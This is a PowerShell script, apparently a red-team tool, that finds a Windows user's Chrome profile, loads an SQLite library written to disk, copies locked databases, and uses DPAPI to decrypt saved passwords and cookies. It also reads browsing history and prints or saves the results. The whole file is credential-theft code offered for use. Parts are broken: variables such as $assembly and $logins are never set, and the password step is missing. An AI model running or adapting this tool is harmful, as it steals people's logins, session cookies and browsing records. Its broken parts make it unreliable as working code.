﻿<#
Author: Lee Christensen (@tifkin_)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

Initially based off of work done by Chris Ross(@xorrior) at https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-ChromeDump.ps1
#>

function Get-ChromeDefaultDirectory {
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6){
      "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else{
      "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }
}

function Install-SqlLiteAssembly {
    [CmdletBinding()]
    Param()

    try {
        $null = [System.Data.SQLite.SQLiteConnection]
        Write-Verbose "SQLLite assembly already loaded"
    }
    catch {
        Write-Verbose "Loading SQLLite assembly"
        if([IntPtr]::Size -eq 8)
        {
            #64 bit version
        }
        else
        {
            #32 bit version
        }

        #Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
        #DLL for sqlite queries and parsing
        #http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
    
        $content = [System.Convert]::FromBase64String($assembly) 
        $assemblyPath = "$($env:TEMP)\System.Data.SQLite.dll" 
        Write-Verbose "[+]System.Data.SQLite.dll will be written to disk at $($assemblyPath)"
    
        if(Test-path $assemblyPath)
        {
          try 
          {
            Add-Type -Path $assemblyPath
          }
          catch 
          {
            Write-Warning "Unable to load SQLite assembly"
            break
          }
        }
        else
        {
            [System.IO.File]::WriteAllBytes($assemblyPath,$content)
            Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
            try 
            {
                Add-Type -Path $assemblyPath
                Write-Warning "[!] Please remove SQLite assembly from here when finished: $assemblyPath"

            }
            catch 
            {
                Write-Warning "Unable to load SQLite assembly"
            }
        }
    }
}


function Get-SqlQueryResult {
    Param (
        [string]
        $DatabasePath,

        [string]
        $Query,

        [switch]
        $BypassDatabaseLock
    )

    $PerformedBypass = $false
    $TmpFile = $null

    try {
        $ConnStr = "Data Source=$DatabasePath; Read Only=True; Version=3;"
        $Connection = New-Object System.Data.SQLite.SQLiteConnection($ConnStr)
        $OpenConnection = $Connection.OpenAndReturn()

        $Dataset = New-Object System.Data.DataSet
        $DataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($Query,$OpenConnection)
        $null = $DataAdapter.fill($Dataset)

        #$DataAdapter

        Write-Verbose "Opened DB file $loginDatadb"

    } catch {
        if($_.Exception.Message -match 'database is locked') {
            $OpenConnection.Close()
            $DataAdapter.Dispose()  # Relese the file handle

            if($BypassDatabaseLock) {
                $TmpFile = [System.IO.Path]::GetTempFileName()
                Copy-Item $DatabasePath $TmpFile

                $ConnStr = "Data Source=$TmpFile; Read Only=True; Version=3;"
                $Connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)
                $OpenConnection = $Connection.OpenAndReturn()

                $Dataset = New-Object System.Data.DataSet
                $DataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($Query,$OpenConnection)
                $null = $DataAdapter.fill($Dataset)

                #$DataAdapter

                Write-Verbose "Opened locked DB file by copying it to $loginDatadb"
                $PerformedBypass = $true
            } else {
                throw $_
            }
        } else {
            throw $_
        }
    }

    try {

        Write-Verbose "Parsing results of query $query"

        $Dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
            $Obj = @{}      
            $_.psobject.properties | ForEach-Object { $Obj[$_.Name] = $_.Value }
            New-Object PSObject -Property $Obj
        }
    } catch {
        throw $_
    } finally {
        if($OpenConnection.State -eq [System.Data.ConnectionState]::Open) {
            $OpenConnection.Close()
            $DataAdapter.Dispose()  # Maintains a handle to the DB until disposed
        }

        if($PerformedBypass) {
            Remove-Item $TmpFile
        }
    }
}


function ConvertTo-UnprotectedDpapiBlob {
    Param (
        [Parameter(ValueFromPipeline = $true,
                   ValueFromPipelineByPropertyName = $true,
                   Position = 0)]
        [byte[]]
        $Bytes,

        [Parameter(Mandatory = $false,
                   Position = 1)]
        [Security.Cryptography.DataProtectionScope]
        $Scope = [Security.Cryptography.DataProtectionScope]::CurrentUser,

        [Parameter(Mandatory = $false,
                   Position = 2)]
        [byte[]]
        $Entropy = $null
    )

    [Security.Cryptography.ProtectedData]::Unprotect($Bytes, $Entropy, $Scope)
}


function Get-ChromeSavedPasswords {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false)]
        [string]
        $DatabasePath = "$(Get-ChromeDefaultDirectory)\Login Data",

        [switch]
        $BypassDatabaseLock
    )


    try {

        Write-Verbose "Parsing results of query $query"

        Get-SqlQueryResult -DatabasePath $DatabasePath -BypassDatabaseLock:$BypassDatabaseLock -Query "SELECT * FROM logins" | ForEach-Object {
            $EncryptedBytes = $_.password_value
            $Username = $_.username_value
            $Url = $_.action_url
        
            New-Object PSObject -Property @{
                Url = $Url
                Username = $Username 
                Password = [System.Text.Encoding]::ASCII.GetString((ConvertTo-UnprotectedDpapiBlob $EncryptedBytes))
            }
        }
    } catch {
        throw $_
    } finally {
        if($OpenConnection.State -eq [System.Data.ConnectionState]::Open) {
            $OpenConnection.Close()
            $DataAdapter.Dispose()  # Maintains a handle to the DB until disposed
        }
    }
}


function Get-ChromeCookies {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false)]
        [string]
        $DatabasePath = "$(Get-ChromeDefaultDirectory)\Cookies",

        [string]
        $Domain = '*',

        [string]
        $Name = '*',

        [string]
        $Value = '*'
    )

    Install-SqlLiteAssembly

    $Options = [System.Management.Automation.WildcardOptions]::Compiled -bor [System.Management.Automation.WildcardOptions]::IgnoreCase
    $DomainPattern = New-Object System.Management.Automation.WildcardPattern($Domain, $Options);
    $NamePattern = New-Object System.Management.Automation.WildcardPattern($Name, $Options);
    $ValuePattern = New-Object System.Management.Automation.WildcardPattern($Value, $Options);

    if($PSVersionTable.PSVersion.Major -ge 3) {
        # Meh, this isn't perfect, but it works for most use cases and dramatically speeds up queries
        $Query = "SELECT host_key,name,encrypted_value,expires_utc,last_access_utc FROM cookies WHERE host_key LIKE '$($DomainPattern.ToWql())' and name LIKE '$($NamePattern.ToWql())'"
    } else {
        $Query = "SELECT * FROM cookies;"
    }

    #$Query = "SELECT * FROM cookies;"

    Write-Verbose "Parsing results of query $query"

    Get-SqlQueryResult -DatabasePath $DatabasePath -Query $Query | ForEach-Object {
        $CookieDomain = $_.host_key
        $CookieName = $_.name
        $CookieEncryptedValue = $_.encrypted_value
        $ExpireDate = $_.expires_utc
        $LastAccessDate = $_.last_access_utc

        if(-not $DomainPattern.IsMatch($CookieDomain)) {
            return
        }

        if(-not $NamePattern.IsMatch($CookieName)) {
            return
        }

        $CookieUnencryptedValue = (ConvertTo-UnprotectedDpapiBlob $CookieEncryptedValue)

        if($CookieUnencryptedValue) {
            $CookieValue = [System.Text.Encoding]::UTF8.GetString($CookieUnencryptedValue)
        } else {
            $CookieValue = ''
        }

        if(-not $ValuePattern.IsMatch($CookieUnencryptedValue)) {
            return
        }

        New-Object PSObject -Property @{
            Domain = $CookieDomain
            Path = $_.path
            Name = $CookieName
            Value = $CookieValue
            LastAccessDate = (Get-Date '1601-01-01T00:00:00Z').AddMilliseconds(($LastAccessDate/1000)).ToLocalTime()
            ExpirationDate = (Get-Date '1601-01-01T00:00:00Z').AddMilliseconds(($ExpireDate/1000)).ToLocalTime()
            Secure = [bool]$_.secure
            HttpOnly = [bool]$_.httponly
            Persistent = [bool]$_.persistent
            FirstParty = [bool]$_.firstpartyonly
        }
    }
}


function Get-ChromeHistory {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false)]
        [string]
        $DatabasePath = "$(Get-ChromeDefaultDirectory)\History",

        [string]
        $Url = '*',

        [string]
        $Title = '*',

        [switch]
        $BypassDatabaseLock
    )

    Install-SqlLiteAssembly

    $Options = [System.Management.Automation.WildcardOptions]::Compiled -bor [System.Management.Automation.WildcardOptions]::IgnoreCase
    $UrlPattern = New-Object System.Management.Automation.WildcardPattern($Url, $Options);
    $TitlePattern = New-Object System.Management.Automation.WildcardPattern($Title, $Options);

    try {

        Write-Verbose "Parsing results of query $query"

        if($PSVersionTable.PSVersion.Major -ge 3) {
            # Meh, this isn't perfect, but it works for most use cases and dramatically speeds up queries
            $Query = "SELECT url,title,visit_count,last_visit_time FROM urls WHERE url LIKE '$($UrlPattern.ToWql())' and title LIKE '$($TitlePattern.ToWql())'"
        } else {
            $Query = "SELECT url,title,visit_count,last_visit_time FROM urls"
        }

        #$Query = "SELECT url,title,visit_count,last_visit_time FROM urls"


        Get-SqlQueryResult -DatabasePath $DatabasePath -BypassDatabaseLock:$BypassDatabaseLock -Query $Query | ForEach-Object {
            
            if(-not $UrlPattern.IsMatch($_.url)) {
                return
            }

            if(-not $TitlePattern.IsMatch($_.title)) {
                return
            }

            New-Object PSObject -Property @{
                Url = $_.url
                Title = $_.title
                VisitCount = $_.visit_count
                LastVisitDate = (Get-Date '1601-01-01T00:00:00Z').AddMilliseconds(($_.last_visit_time/1000)).ToLocalTime()
            }
        }
    } catch {
        throw $_
    } finally {
        if($OpenConnection.State -eq [System.Data.ConnectionState]::Open) {
            $OpenConnection.Close()
            $DataAdapter.Dispose()  # Maintains a handle to the DB until disposed
        }
    }
}


function Get-ChromeDump {

  <#
  .SYNOPSIS
  This function returns any passwords and history stored in the chrome sqlite databases.

  .DESCRIPTION
  This function uses the System.Data.SQLite assembly to parse the different sqlite db files used by chrome to save passwords and browsing history. The System.Data.SQLite assembly
  cannot be loaded from memory. This is a limitation for assemblies that contain any unmanaged code and/or compiled without the /clr:safe option.

  .PARAMETER OutFile
  Switch to dump all results out to a file.

  .EXAMPLE

  Get-ChromeDump -OutFile "$env:HOMEPATH\chromepwds.txt"

  Dump All chrome passwords and history to the specified file

  .LINK
  http://www.xorrior.com

  #>

  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]
    $OutFile,

    [ValidateSet('Cookies','Passwords','History')]
    [string[]]
    $Item
  )
    #Add the required assembly for decryption

    Add-Type -Assembly System.Security

    #Check to see if the script is being run as SYSTEM. Not going to work.
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
        Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
        $NoPasswords = $True
    }

    if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
        if($Item.Contains('Passwords') -or $Item.Contains('History')) {
            Write-Error "[+]Cannot parse Chrome databases while Chrome is running. Try running with the -BypassDatabaseLock option"
            break
        }
    }

    #grab the path to Chrome user data
    #grab the path to Chrome user data
    $ChromePath = Get-ChromeDefaultDirectory
    
    if(!(Test-path $ChromePath)){
      Throw "Chrome user data directory does not exist"
    }
    else{
      #DB for CC and other info
      if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
      #DB for passwords 
      if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
      #DB for history
      if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}

      if(Test-Path -Path "$chromepath\Cookies"){$CookiesDb = "$chromepath\Cookies"}
    }

    if(!($NoPasswords)){
      if($IncludeCookies) {
        $Cookies = Get-ChromeCookies
      }


      #Parse the login data DB

    }

    #Parse the History DB
    $connString = "Data Source=$historydb; Version=3;"

    $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)

    $Open = $connection.OpenAndReturn()

    Write-Verbose "Opened DB file $historydb"

    $DataSet = New-Object System.Data.DataSet

    $query = "SELECT * FROM urls;"

    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)

    [void]$dataAdapter.fill($DataSet)

    $History = @()
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
      $HistoryInfo = New-Object PSObject -Property @{
        Title = $_.title 
        URL = $_.url
      }
      $History += $HistoryInfo
    }
    
    if(!($OutFile)){
      "[*]CHROME PASSWORDS`n"
      $logins | Format-Table URL,User,PWD -AutoSize

      "[*]CHROME HISTORY`n"

      $History | Format-List Title,URL 
    }
    else {
        "[*]LOGINS`n" | Out-File $OutFile 
        $logins | Out-File $OutFile -Append

        "[*]HISTORY`n" | Out-File $OutFile -Append
        $History | Out-File $OutFile -Append  

    }
}
